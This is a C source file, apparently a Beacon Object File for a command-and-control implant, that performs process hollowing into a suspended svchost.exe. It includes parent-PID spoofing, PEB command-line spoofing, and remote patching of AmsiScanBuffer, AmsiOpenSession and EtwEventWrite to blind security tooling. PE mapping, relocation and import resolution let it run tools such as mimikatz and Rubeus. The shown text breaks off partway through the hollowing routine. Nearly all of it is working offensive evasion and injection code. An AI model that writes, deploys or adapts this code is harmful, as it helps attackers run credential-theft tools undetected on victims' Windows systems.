#include <windows.h>
#include <winternl.h>
#include <stddef.h>
#include <tlhelp32.h>

#include "hollow_defs.h"
#include "../No-Consolation/include/beacon.h"

#define MODE_PE        0
#define MODE_SHELLCODE 1
#define MODE_DOTNET    2

#define SRC_BYTES      0
#define SRC_LOCAL_PATH 1

#define OUTPUT_YES     0
#define OUTPUT_NO      1

#define DEFAULT_TIMEOUT_MS 60000
#define POLL_INTERVAL_MS   200
#define OUTPUT_CHUNK_MAX   (1024 * 64)

#define DEFAULT_SPAWNTO_W L"C:\\Windows\\System32\\svchost.exe"
#define DEFAULT_SPAWNTO_A "C:\\Windows\\System32\\svchost.exe"

#include "dotnet_host_bytes.h"

#define DOTNET_CFG_MAGIC 0x444E4554
#define DOTNET_FLAG_AMSI 1
#define DOTNET_FLAG_ETW  2

#pragma pack(push, 1)
typedef struct {
    DWORD magic;
    DWORD asm_size;
    DWORD args_size;
    DWORD flags;
} DOTNET_CONFIG_HDR;
#pragma pack(pop)

/* ================================================================
 *  Minimal libc replacements (BOF has no CRT)
 * ================================================================ */

static void *xmemset(void *dest, int c, size_t n) {
    unsigned char *d = (unsigned char *)dest;
    while (n--) *d++ = (unsigned char)c;
    return dest;
}

static void *xmemcpy(void *dest, const void *src, size_t n) {
    unsigned char *d = (unsigned char *)dest;
    const unsigned char *s = (const unsigned char *)src;
    while (n--) *d++ = *s++;
    return dest;
}

/* ================================================================
 *  Process enumeration for PPID spoofing
 * ================================================================ */

static DWORD FindPidByName(const char *procName) {
    PROCESSENTRY32 pe;
    xmemset(&pe, 0, sizeof(pe));
    pe.dwSize = sizeof(PROCESSENTRY32);

    HANDLE hSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    DWORD pid = 0;
    if (KERNEL32$Process32First(hSnap, &pe)) {
        do {
            if (MSVCRT$_stricmp(pe.szExeFile, procName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (KERNEL32$Process32Next(hSnap, &pe));
    }
    KERNEL32$CloseHandle(hSnap);
    return pid;
}

static DWORD FindSpoofParent(const char *spawntoA) {
    const char *name = spawntoA;
    const char *p = spawntoA;
    while (*p) {
        if (*p == '\\' || *p == '/') name = p + 1;
        p++;
    }

    if (MSVCRT$_stricmp(name, "svchost.exe") == 0)
        return FindPidByName("services.exe");
    if (MSVCRT$_stricmp(name, "RuntimeBroker.exe") == 0 ||
        MSVCRT$_stricmp(name, "dllhost.exe") == 0 ||
        MSVCRT$_stricmp(name, "taskhostw.exe") == 0)
        return FindPidByName("svchost.exe");
    if (MSVCRT$_stricmp(name, "WerFault.exe") == 0)
        return FindPidByName("svchost.exe");

    return FindPidByName("explorer.exe");
}

/* ================================================================
 *  AMSI + ETW patching in remote process
 *
 *  Strategy: force-load amsi.dll into child via CreateRemoteThread
 *  + LoadLibraryA, then patch AmsiScanBuffer and AmsiOpenSession.
 *  ETW: patch EtwEventWrite in ntdll.
 *
 *  Both use the per-boot ASLR property: DLLs map at the same base
 *  in every process for a given boot session, so local GetProcAddress
 *  gives the correct remote address.
 *
 *  Verification: read back patched bytes to confirm write landed.
 * ================================================================ */

static BOOL PatchRemoteFunction(HANDLE hProcess, HMODULE hLocalMod,
                                const char *funcName, BYTE *patch, DWORD patchLen) {
    FARPROC pFunc = KERNEL32$GetProcAddress(hLocalMod, funcName);
    if (!pFunc) return FALSE;

    LPVOID pRemoteFunc = (LPVOID)pFunc;

    DWORD dwOldProtect = 0;
    if (!KERNEL32$VirtualProtectEx(hProcess, pRemoteFunc, patchLen, PAGE_READWRITE, &dwOldProtect))
        return FALSE;

    SIZE_T written = 0;
    BOOL ok = KERNEL32$WriteProcessMemory(hProcess, pRemoteFunc, patch, patchLen, &written);

    DWORD dwDummy = 0;
    KERNEL32$VirtualProtectEx(hProcess, pRemoteFunc, patchLen, dwOldProtect, &dwDummy);

    if (!ok || written != patchLen) return FALSE;

    BYTE verify[16];
    SIZE_T br = 0;
    if (patchLen <= sizeof(verify)) {
        if (KERNEL32$ReadProcessMemory(hProcess, pRemoteFunc, verify, patchLen, &br) && br == patchLen) {
            for (DWORD i = 0; i < patchLen; i++) {
                if (verify[i] != patch[i]) return FALSE;
            }
        }
    }

    return TRUE;
}

static void PatchAMSI(HANDLE hProcess) {
    HMODULE hKernel = KERNEL32$GetModuleHandleA("kernel32.dll");
    if (!hKernel) return;

    FARPROC pLoadLib = KERNEL32$GetProcAddress(hKernel, "LoadLibraryA");
    if (!pLoadLib) return;

    const char amsiName[] = "amsi.dll";
    LPVOID pRemoteStr = KERNEL32$VirtualAllocEx(hProcess, NULL, sizeof(amsiName),
                                                 MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteStr) return;

    SIZE_T bw = 0;
    KERNEL32$WriteProcessMemory(hProcess, pRemoteStr, amsiName, sizeof(amsiName), &bw);

    HANDLE hThread = KERNEL32$CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)pLoadLib, pRemoteStr, 0, NULL);
    if (!hThread) {
        KERNEL32$VirtualFreeEx(hProcess, pRemoteStr, 0, MEM_RELEASE);
        return;
    }

    KERNEL32$WaitForSingleObject(hThread, 5000);

    DWORD exitCode = 0;
    KERNEL32$GetExitCodeThread(hThread, &exitCode);
    KERNEL32$CloseHandle(hThread);
    KERNEL32$VirtualFreeEx(hProcess, pRemoteStr, 0, MEM_RELEASE);

    if (exitCode == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] amsi.dll load failed in child (may not exist)");
        return;
    }

    HMODULE hAmsi = KERNEL32$LoadLibraryA("amsi.dll");
    if (!hAmsi) return;

    /* xor eax, eax; ret — AmsiScanBuffer returns S_OK, result = AMSI_RESULT_CLEAN */
    BYTE amsiPatch[] = { 0x31, 0xC0, 0xC3 };
    if (PatchRemoteFunction(hProcess, hAmsi, "AmsiScanBuffer", amsiPatch, sizeof(amsiPatch))) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] AMSI: AmsiScanBuffer patched (verified)");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] AMSI: AmsiScanBuffer patch FAILED");
    }

    BYTE amsiOpenPatch[] = { 0x31, 0xC0, 0xC3 };
    if (PatchRemoteFunction(hProcess, hAmsi, "AmsiOpenSession", amsiOpenPatch, sizeof(amsiOpenPatch))) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] AMSI: AmsiOpenSession patched (verified)");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] AMSI: AmsiOpenSession patch failed");
    }

    KERNEL32$FreeLibrary(hAmsi);
}

static void PatchETW(HANDLE hProcess) {
    HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;

    /* xor eax, eax; ret */
    BYTE etwPatch[] = { 0x33, 0xC0, 0xC3 };
    if (PatchRemoteFunction(hProcess, hNtdll, "EtwEventWrite", etwPatch, sizeof(etwPatch))) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] ETW: EtwEventWrite patched (verified)");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] ETW: EtwEventWrite patch FAILED");
    }
}

/* ================================================================
 *  Section protection mapping
 * ================================================================ */

static DWORD SectionCharToProtect(DWORD c) {
    BOOL x = (c & IMAGE_SCN_MEM_EXECUTE) != 0;
    BOOL r = (c & IMAGE_SCN_MEM_READ)    != 0;
    BOOL w = (c & IMAGE_SCN_MEM_WRITE)   != 0;

    if (x && w && r) return PAGE_EXECUTE_READWRITE;
    if (x && r)      return PAGE_EXECUTE_READ;
    if (x && w)      return PAGE_EXECUTE_WRITECOPY;
    if (x)           return PAGE_EXECUTE;
    if (w && r)      return PAGE_READWRITE;
    if (w)           return PAGE_WRITECOPY;
    if (r)           return PAGE_READONLY;
    return PAGE_NOACCESS;
}

static BOOL AdjustSectionProtections(HANDLE hProcess, ULONG_PTR baseAddr,
                                     PIMAGE_NT_HEADERS pNt, PIMAGE_SECTION_HEADER pSec) {
    BOOL allOk = TRUE;
    for (DWORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (!pSec[i].SizeOfRawData || !pSec[i].VirtualAddress) continue;

        DWORD prot = SectionCharToProtect(pSec[i].Characteristics);
        DWORD oldProt = 0;
        if (!KERNEL32$VirtualProtectEx(hProcess,
                (PVOID)(baseAddr + pSec[i].VirtualAddress),
                pSec[i].SizeOfRawData, prot, &oldProt)) {
            BeaconPrintf(CALLBACK_ERROR, "VirtualProtectEx section %d: %lu", i, KERNEL32$GetLastError());
            allOk = FALSE;
        }
    }
    return allOk;
}

/* ================================================================
 *  Output capture
 * ================================================================ */

static void DrainPipe(HANDLE hPipe) {
    for (;;) {
        DWORD avail = 0;
        if (!KERNEL32$PeekNamedPipe(hPipe, NULL, 0, NULL, &avail, NULL) || avail == 0) return;

        DWORD toRead = avail < OUTPUT_CHUNK_MAX ? avail : OUTPUT_CHUNK_MAX;
        BYTE *buf = (BYTE*)KERNEL32$LocalAlloc(0x40, toRead + 1);
        if (!buf) return;

        DWORD bytesRead = 0;
        if (KERNEL32$ReadFile(hPipe, buf, toRead, &bytesRead, NULL) && bytesRead > 0) {
            buf[bytesRead] = '\0';
            BeaconOutput(CALLBACK_OUTPUT, (char*)buf, bytesRead);
        }
        KERNEL32$LocalFree(buf);
        if (bytesRead < toRead) return;
    }
}

static void CollectOutput(HANDLE hProcess, HANDLE hPipe, DWORD timeoutMs) {
    DWORD elapsed = 0;
    DWORD exitCode = 259; /* STILL_ACTIVE */

    while (elapsed < timeoutMs) {
        if (!KERNEL32$GetExitCodeProcess(hProcess, &exitCode)) break;
        if (exitCode != 259) break;

        DrainPipe(hPipe);
        KERNEL32$Sleep(POLL_INTERVAL_MS);
        elapsed += POLL_INTERVAL_MS;
    }

    DrainPipe(hPipe);

    if (elapsed >= timeoutMs && exitCode == 259) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Timeout (%lus), terminating child", timeoutMs / 1000);
        KERNEL32$TerminateProcess(hProcess, 1);
    }
}

/* ================================================================
 *  Create suspended process with PPID spoof + BlockDLLs
 * ================================================================ */

typedef struct {
    STARTUPINFOEXA si;
    LPPROC_THREAD_ATTRIBUTE_LIST attrList;
    HANDLE hParent;
    HANDLE hPipeOutRead;
    HANDLE hPipeOutWrite;
    HANDLE hPipeInRead;
    HANDLE hPipeInWrite;
    PROCESS_INFORMATION pi;
} SPAWN_CTX;

static void SpawnCleanup(SPAWN_CTX *ctx, BOOL keepProc) {
    if (ctx->attrList) {
        KERNEL32$DeleteProcThreadAttributeList(ctx->attrList);
        KERNEL32$LocalFree(ctx->attrList);
        ctx->attrList = NULL;
    }
    if (ctx->hParent) { KERNEL32$CloseHandle(ctx->hParent); ctx->hParent = NULL; }
    if (ctx->hPipeInRead) { KERNEL32$CloseHandle(ctx->hPipeInRead); ctx->hPipeInRead = NULL; }
    if (ctx->hPipeOutWrite) { KERNEL32$CloseHandle(ctx->hPipeOutWrite); ctx->hPipeOutWrite = NULL; }
    if (!keepProc) {
        if (ctx->hPipeOutRead) { KERNEL32$CloseHandle(ctx->hPipeOutRead); ctx->hPipeOutRead = NULL; }
        if (ctx->hPipeInWrite) { KERNEL32$CloseHandle(ctx->hPipeInWrite); ctx->hPipeInWrite = NULL; }
        if (ctx->pi.hProcess) {
            KERNEL32$TerminateProcess(ctx->pi.hProcess, 1);
            KERNEL32$CloseHandle(ctx->pi.hProcess);
            ctx->pi.hProcess = NULL;
        }
        if (ctx->pi.hThread) { KERNEL32$CloseHandle(ctx->pi.hThread); ctx->pi.hThread = NULL; }
    }
}

static BOOL SpawnSuspended(const char *spawntoA, BOOL wantOutput, BOOL blockDlls,
                           BOOL noPpid, int realCmdMinBytes, SPAWN_CTX *ctx) {
    xmemset(ctx, 0, sizeof(SPAWN_CTX));
    ctx->si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    SECURITY_ATTRIBUTES sa;
    xmemset(&sa, 0, sizeof(sa));
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;

    if (wantOutput) {
        if (!KERNEL32$CreatePipe(&ctx->hPipeOutRead, &ctx->hPipeOutWrite, &sa, 0)) {
            BeaconPrintf(CALLBACK_ERROR, "CreatePipe out: %lu", KERNEL32$GetLastError());
            return FALSE;
        }
        if (!KERNEL32$CreatePipe(&ctx->hPipeInRead, &ctx->hPipeInWrite, &sa, 0)) {
            BeaconPrintf(CALLBACK_ERROR, "CreatePipe in: %lu", KERNEL32$GetLastError());
            SpawnCleanup(ctx, FALSE);
            return FALSE;
        }
        KERNEL32$SetHandleInformation(ctx->hPipeOutRead, 1, 0);
        KERNEL32$SetHandleInformation(ctx->hPipeInWrite, 1, 0);

        ctx->si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
        ctx->si.StartupInfo.wShowWindow = SW_HIDE;
        ctx->si.StartupInfo.hStdInput  = ctx->hPipeInRead;
        ctx->si.StartupInfo.hStdOutput = ctx->hPipeOutWrite;
        ctx->si.StartupInfo.hStdError  = ctx->hPipeOutWrite;
    } else {
        ctx->si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
        ctx->si.StartupInfo.wShowWindow = SW_HIDE;
    }

    DWORD64 blockDllsPolicy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

    if (!noPpid) {
        DWORD parentPid = FindSpoofParent(spawntoA);
        if (parentPid) {
            ctx->hParent = KERNEL32$OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);
            if (ctx->hParent)
                BeaconPrintf(CALLBACK_OUTPUT, "[+] PPID spoof: PID %lu", parentPid);
        }
    }

    DWORD attrCount = 0;
    if (ctx->hParent) attrCount++;
    if (blockDlls) attrCount++;

    if (attrCount > 0) {
        SIZE_T attrSize = 0;
        KERNEL32$InitializeProcThreadAttributeList(NULL, attrCount, 0, &attrSize);
        ctx->attrList = (LPPROC_THREAD_ATTRIBUTE_LIST)KERNEL32$LocalAlloc(0x40, attrSize);
        if (!ctx->attrList || !KERNEL32$InitializeProcThreadAttributeList(ctx->attrList, attrCount, 0, &attrSize)) {
            BeaconPrintf(CALLBACK_ERROR, "InitAttrList: %lu", KERNEL32$GetLastError());
            SpawnCleanup(ctx, FALSE);
            return FALSE;
        }

        if (ctx->hParent) {
            if (!KERNEL32$UpdateProcThreadAttribute(ctx->attrList, 0,
                    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    &ctx->hParent, sizeof(HANDLE), NULL, NULL)) {
                BeaconPrintf(CALLBACK_OUTPUT, "[!] PPID spoof failed (%lu), continuing", KERNEL32$GetLastError());
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] PPID spoofed");
            }
        }

        if (blockDlls) {
            if (!KERNEL32$UpdateProcThreadAttribute(ctx->attrList, 0,
                    PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                    &blockDllsPolicy, sizeof(blockDllsPolicy), NULL, NULL)) {
                BeaconPrintf(CALLBACK_OUTPUT, "[!] BlockDLLs failed (%lu)", KERNEL32$GetLastError());
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] BlockDLLs enabled");
            }
        }

        ctx->si.lpAttributeList = ctx->attrList;
    }

    char fakeCmd[4096];
    xmemset(fakeCmd, 0, sizeof(fakeCmd));
    int fakeLen = MSVCRT$_snprintf(fakeCmd, sizeof(fakeCmd) - 1,
        "%s -k LocalServiceNetworkRestricted", spawntoA);
    if (fakeLen < 0) fakeLen = MSVCRT$strlen(fakeCmd);
    if (realCmdMinBytes > 0 && fakeLen < realCmdMinBytes) {
        int i;
        for (i = fakeLen; i < realCmdMinBytes && i < (int)sizeof(fakeCmd) - 1; i++)
            fakeCmd[i] = ' ';
        fakeCmd[i] = '\0';
    }

    DWORD flags = CREATE_SUSPENDED | CREATE_NO_WINDOW;
    if (attrCount > 0) flags |= EXTENDED_STARTUPINFO_PRESENT;

    {
        HANDLE hImpToken = NULL;
        HANDLE hPrimToken = NULL;
        BOOL tokenCreate = FALSE;

        if (ADVAPI32$OpenThreadToken((HANDLE)(LONG_PTR)-2,
                TOKEN_DUPLICATE | TOKEN_QUERY, FALSE, &hImpToken)) {
            if (ADVAPI32$DuplicateTokenEx(hImpToken, MAXIMUM_ALLOWED, NULL,
                    SecurityImpersonation, TokenPrimary, &hPrimToken)) {
                tokenCreate = ADVAPI32$CreateProcessAsUserA(hPrimToken,
                    NULL, fakeCmd, NULL, NULL, wantOutput ? TRUE : FALSE,
                    flags, NULL, NULL, (LPSTARTUPINFOA)&ctx->si, &ctx->pi);
                if (tokenCreate)
                    BeaconPrintf(CALLBACK_OUTPUT, "[+] Process created with impersonation token");
                else
                    BeaconPrintf(CALLBACK_OUTPUT, "[!] CreateProcessAsUserA: %lu, fallback",
                        KERNEL32$GetLastError());
                KERNEL32$CloseHandle(hPrimToken);
            }
            KERNEL32$CloseHandle(hImpToken);
        }

        if (!tokenCreate) {
            if (!KERNEL32$CreateProcessA(NULL, fakeCmd, NULL, NULL, wantOutput ? TRUE : FALSE,
                    flags, NULL, NULL, (LPSTARTUPINFOA)&ctx->si, &ctx->pi)) {
                BeaconPrintf(CALLBACK_ERROR, "CreateProcess: %lu", KERNEL32$GetLastError());
                SpawnCleanup(ctx, FALSE);
                return FALSE;
            }
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Spawned %s (PID %lu) suspended", spawntoA, ctx->pi.dwProcessId);

    if (ctx->hPipeOutWrite) { KERNEL32$CloseHandle(ctx->hPipeOutWrite); ctx->hPipeOutWrite = NULL; }
    if (ctx->hPipeInRead)   { KERNEL32$CloseHandle(ctx->hPipeInRead);   ctx->hPipeInRead = NULL; }
    if (ctx->attrList) {
        KERNEL32$DeleteProcThreadAttributeList(ctx->attrList);
        KERNEL32$LocalFree(ctx->attrList);
        ctx->attrList = NULL;
    }
    if (ctx->hParent) { KERNEL32$CloseHandle(ctx->hParent); ctx->hParent = NULL; }

    return TRUE;
}

/* ================================================================
 *  PEB command-line spoofing
 * ================================================================ */

static BOOL SpoofCommandLine(HANDLE hProcess, const char *realCmdA) {
    PROCESS_BASIC_INFORMATION pbi;
    xmemset(&pbi, 0, sizeof(pbi));

    NTSTATUS st = NTDLL$NtQueryInformationProcess(hProcess, 0,
                                                   &pbi, sizeof(pbi), NULL);
    if (st != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] PEB query failed (0x%lx)", st);
        return FALSE;
    }

    PEB peb;
    xmemset(&peb, 0, sizeof(peb));
    SIZE_T br = 0;
    if (!KERNEL32$ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &br))
        return FALSE;

    RTL_USER_PROCESS_PARAMETERS params;
    xmemset(&params, 0, sizeof(params));
    if (!KERNEL32$ReadProcessMemory(hProcess, peb.ProcessParameters, &params, sizeof(params), &br))
        return FALSE;

    int wideLen = KERNEL32$MultiByteToWideChar(0, 0, realCmdA, -1, NULL, 0);
    if (wideLen == 0) return FALSE;

    LPWSTR wideBuf = (LPWSTR)KERNEL32$LocalAlloc(0x40, wideLen * sizeof(WCHAR));
    if (!wideBuf) return FALSE;

    KERNEL32$MultiByteToWideChar(0, 0, realCmdA, -1, wideBuf, wideLen);

    USHORT realSizeBytes = (USHORT)(wideLen * sizeof(WCHAR));
    SIZE_T bw = 0;

    BOOL ok1 = KERNEL32$WriteProcessMemory(hProcess, params.CommandLine.Buffer, wideBuf, realSizeBytes, &bw);

    USHORT newLen = (USHORT)((wideLen - 1) * sizeof(WCHAR));
    BOOL ok2 = KERNEL32$WriteProcessMemory(hProcess,
        (PBYTE)peb.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length),
        &newLen, sizeof(USHORT), &bw);

    KERNEL32$LocalFree(wideBuf);

    if (!ok1 || !ok2) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CmdLine spoof partial failure (write1=%d write2=%d)", ok1, ok2);
        return FALSE;
    }
    return TRUE;
}

/* ================================================================
 *  PE Validation
 * ================================================================ */

static BOOL ValidatePE(BYTE *peData, DWORD peSize, PIMAGE_NT_HEADERS *ppNt) {
    if (peSize < sizeof(IMAGE_DOS_HEADER)) {
        BeaconPrintf(CALLBACK_ERROR, "PE too small for DOS header");
        return FALSE;
    }

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)peData;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
        BeaconPrintf(CALLBACK_ERROR, "Bad DOS signature");
        return FALSE;
    }

    if (pDos->e_lfanew < 0 || (DWORD)pDos->e_lfanew + sizeof(IMAGE_NT_HEADERS) > peSize) {
        BeaconPrintf(CALLBACK_ERROR, "e_lfanew out of bounds");
        return FALSE;
    }

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(peData + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) {
        BeaconPrintf(CALLBACK_ERROR, "Bad NT signature");
        return FALSE;
    }

    if (pNt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
        BeaconPrintf(CALLBACK_ERROR, "PE is not x64 (machine=0x%x)", pNt->FileHeader.Machine);
        return FALSE;
    }

    if (pNt->OptionalHeader.SizeOfImage == 0) {
        BeaconPrintf(CALLBACK_ERROR, "SizeOfImage is zero");
        return FALSE;
    }

    if (pNt->OptionalHeader.AddressOfEntryPoint == 0) {
        BeaconPrintf(CALLBACK_ERROR, "AddressOfEntryPoint is zero (.NET PE? Use execute-assembly)");
        return FALSE;
    }

    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    DWORD secEnd = pDos->e_lfanew + sizeof(IMAGE_NT_HEADERS) +
                   (pNt->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER));
    if (secEnd > peSize) {
        BeaconPrintf(CALLBACK_ERROR, "Section table extends past file");
        return FALSE;
    }

    for (DWORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSec[i].PointerToRawData + pSec[i].SizeOfRawData > peSize) {
            BeaconPrintf(CALLBACK_ERROR, "Section %d raw data exceeds file", i);
            return FALSE;
        }
    }

    *ppNt = pNt;
    return TRUE;
}

/* ================================================================
 *  Map flat PE file into a SizeOfImage buffer (sections at VA offsets)
 *
 *  ResolveImports and ApplyRelocations use RVAs as offsets, which only
 *  works on a mapped image — NOT on the flat file where sections sit
 *  at PointerToRawData offsets.  This function creates that mapped copy.
 * ================================================================ */

static BYTE* MapPEToImage(BYTE *peData, DWORD peSize, PIMAGE_NT_HEADERS pNt) {
    DWORD imageSize = pNt->OptionalHeader.SizeOfImage;
    BYTE *mapped = (BYTE*)KERNEL32$LocalAlloc(0x40, imageSize);
    if (!mapped) return NULL;

    xmemset(mapped, 0, imageSize);
    xmemcpy(mapped, peData, pNt->OptionalHeader.SizeOfHeaders);

    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    for (DWORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSec[i].SizeOfRawData == 0) continue;
        if (pSec[i].PointerToRawData + pSec[i].SizeOfRawData > peSize) continue;
        if (pSec[i].VirtualAddress + pSec[i].SizeOfRawData > imageSize) continue;
        xmemcpy(mapped + pSec[i].VirtualAddress,
                peData + pSec[i].PointerToRawData,
                pSec[i].SizeOfRawData);
    }

    return mapped;
}

/* ================================================================
 *  Import resolution
 *
 *  Operates on a MAPPED image (sections at VA offsets) so RVAs
 *  work directly as buffer offsets.  Uses per-boot ASLR property:
 *  DLLs map at same base in every process for a given boot.
 * ================================================================ */

static BOOL ResolveImports(BYTE *mapped, DWORD imageSize, PIMAGE_NT_HEADERS pNt) {
    IMAGE_DATA_DIRECTORY impDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (impDir.Size == 0 || impDir.VirtualAddress == 0)
        return TRUE;

    if (impDir.VirtualAddress + sizeof(IMAGE_IMPORT_DESCRIPTOR) > imageSize) {
        BeaconPrintf(CALLBACK_ERROR, "Import directory out of bounds");
        return FALSE;
    }

    PIMAGE_IMPORT_DESCRIPTOR pImp = (PIMAGE_IMPORT_DESCRIPTOR)(mapped + impDir.VirtualAddress);

    for (; pImp->Name != 0; pImp++) {
        if (pImp->Name >= imageSize) {
            BeaconPrintf(CALLBACK_ERROR, "Import DLL name offset out of bounds");
            return FALSE;
        }

        char *dllName = (char*)(mapped + pImp->Name);
        HMODULE hMod = KERNEL32$LoadLibraryA(dllName);
        if (!hMod) {
            BeaconPrintf(CALLBACK_ERROR, "LoadLibraryA(%s) failed: %lu", dllName, KERNEL32$GetLastError());
            return FALSE;
        }

        ULONG_PTR *pThunk;
        ULONG_PTR *pOrigThunk;

        if (pImp->FirstThunk >= imageSize) {
            BeaconPrintf(CALLBACK_ERROR, "FirstThunk out of bounds for %s", dllName);
            return FALSE;
        }

        pThunk = (ULONG_PTR*)(mapped + pImp->FirstThunk);

        if (pImp->OriginalFirstThunk && pImp->OriginalFirstThunk < imageSize)
            pOrigThunk = (ULONG_PTR*)(mapped + pImp->OriginalFirstThunk);
        else
            pOrigThunk = pThunk;

        for (int i = 0; pOrigThunk[i] != 0; i++) {
            FARPROC pFunc;

            if (pOrigThunk[i] & IMAGE_ORDINAL_FLAG64) {
                WORD ordinal = (WORD)(pOrigThunk[i] & 0xFFFF);
                pFunc = KERNEL32$GetProcAddress(hMod, (LPCSTR)(ULONG_PTR)ordinal);
                if (!pFunc) {
                    BeaconPrintf(CALLBACK_ERROR, "%s ordinal %d not found", dllName, ordinal);
                    return FALSE;
                }
            } else {
                if (pOrigThunk[i] >= imageSize) {
                    BeaconPrintf(CALLBACK_ERROR, "Import hint/name out of bounds");
                    return FALSE;
                }
                PIMAGE_IMPORT_BY_NAME pName = (PIMAGE_IMPORT_BY_NAME)(mapped + pOrigThunk[i]);
                pFunc = KERNEL32$GetProcAddress(hMod, pName->Name);
                if (!pFunc) {
                    BeaconPrintf(CALLBACK_ERROR, "%s!%s not found", dllName, pName->Name);
                    return FALSE;
                }
            }

            pThunk[i] = (ULONG_PTR)pFunc;
        }
    }

    return TRUE;
}

/* ================================================================
 *  Relocation processing (operates on mapped image)
 * ================================================================ */

static BOOL ApplyRelocations(BYTE *mapped, DWORD imageSize, PIMAGE_NT_HEADERS pNt, ULONG_PTR delta) {
    if (delta == 0) return TRUE;

    IMAGE_DATA_DIRECTORY relocDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (relocDir.Size == 0) {
        if (pNt->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED) {
            BeaconPrintf(CALLBACK_ERROR, "Relocation needed but PE has no .reloc and relocs stripped");
            return FALSE;
        }
        return TRUE;
    }

    if (relocDir.VirtualAddress >= imageSize) {
        BeaconPrintf(CALLBACK_ERROR, "Relocation directory out of bounds");
        return FALSE;
    }

    BYTE *pBlock = mapped + relocDir.VirtualAddress;
    DWORD processed = 0;

    while (processed < relocDir.Size) {
        DWORD pageRva   = *(DWORD*)(pBlock);
        DWORD blockSize = *(DWORD*)(pBlock + 4);
        if (blockSize == 0 || blockSize < 8) break;

        DWORD entryCount = (blockSize - 8) / 2;
        WORD *entries = (WORD*)(pBlock + 8);

        for (DWORD j = 0; j < entryCount; j++) {
            BYTE type = (BYTE)(entries[j] >> 12);
            WORD offset = entries[j] & 0x0FFF;
            DWORD patchRva = pageRva + offset;

            if (type == IMAGE_REL_BASED_DIR64) {
                if (patchRva + 8 > imageSize) continue;
                ULONG_PTR *pPatch = (ULONG_PTR*)(mapped + patchRva);
                *pPatch += delta;
            } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                if (patchRva + 4 > imageSize) continue;
                DWORD *pPatch = (DWORD*)(mapped + patchRva);
                *pPatch += (DWORD)delta;
            } else if (type == IMAGE_REL_BASED_ABSOLUTE) {
                /* padding, skip */
            }
        }
        pBlock += blockSize;
        processed += blockSize;
    }

    return TRUE;
}

/* ================================================================
 *  Execute TLS callbacks
 *
 *  We inject a small stub into the remote process that calls each
 *  TLS callback with (ImageBase, DLL_PROCESS_ATTACH, NULL).
 *  For simplicity: if TLS callbacks exist, we warn but skip them.
 *  Most offensive PEs (mimikatz, Rubeus, etc.) don't use TLS.
 * ================================================================ */

static void WarnTLSCallbacks(BYTE *peData, PIMAGE_NT_HEADERS pNt) {
    IMAGE_DATA_DIRECTORY tlsDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if (tlsDir.Size == 0 || tlsDir.VirtualAddress == 0) return;

    BeaconPrintf(CALLBACK_OUTPUT, "[!] PE has TLS directory — callbacks will NOT be invoked");
    BeaconPrintf(CALLBACK_OUTPUT, "    Most offensive tools work fine without them");
}

/* ================================================================
 *  PE Hollowing — proper implementation
 *
 *  1. Read remote PEB → get original ImageBase
 *  2. NtUnmapViewOfSection to remove original image
 *  3. VirtualAllocEx at original base (or fallback)
 *  4. Resolve imports locally (uses per-boot ASLR property)
 *  5. Apply relocations if base changed
 *  6. Write headers + sections
 *  7. Set section protections
 *  8. Update PEB ImageBase
 *  9. Set thread context entry point
 *  10. Spoof command line
 *  11. Patch AMSI + ETW
 * ================================================================ */

static BOOL HollowWithPE(HANDLE hProcess, HANDLE hThread, BYTE *peData, DWORD peSize,
                         const char *argsA, const char *spawntoA) {
    PIMAGE_NT_HEADERS pNt = NULL;
    if (!ValidatePE(peData, peSize, &pNt))
        return FALSE;

    WarnTLSCallbacks(peData, pNt);

    /* Step 1: Read original ImageBase from remote PEB */
    CONTEXT ctx;
